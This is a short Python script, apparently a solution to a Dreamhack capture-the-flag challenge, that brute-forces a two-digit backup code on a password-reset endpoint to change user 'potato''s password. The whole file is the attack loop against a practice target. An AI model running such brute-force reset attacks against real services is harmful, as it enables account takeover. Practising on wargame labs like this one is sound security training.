import requests
import time

url = 'http://host3.dreamhack.games:8740/forgot_password'

old = None 
for i in range(0, 100):
    time.sleep(1)
    payload = {'userid': 'potato', 'newpassword': 'test', 'backupCode': i}
    response = requests.post(url, data=payload)
    print(i)
    if old is not None and old != response.text:
        print(i)
        break
    old = response.text

